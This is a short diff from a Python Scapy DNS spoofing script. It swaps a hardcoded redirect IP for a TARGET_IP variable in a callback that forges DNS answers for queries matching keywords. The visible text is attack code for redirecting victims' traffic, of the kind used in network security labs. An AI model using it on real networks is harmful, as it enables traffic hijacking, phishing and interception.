@@ -15,7 +15,7 @@ def call_back(pkt):
         for k in keywords:
             if k in qname:
                 print('[+] Spoofing DNS query!')
-                scapy_pkt[scapy.DNS].an = scapy.DNSRR( rrname = qname, rdata = '192.168.83.199'  )
+                scapy_pkt[scapy.DNS].an = scapy.DNSRR( rrname = qname, rdata = TARGET_IP )
                 scapy_pkt[scapy.DNS].ancount = 1
 
                 # Scapy will recalculate the following fields, so we can delete them
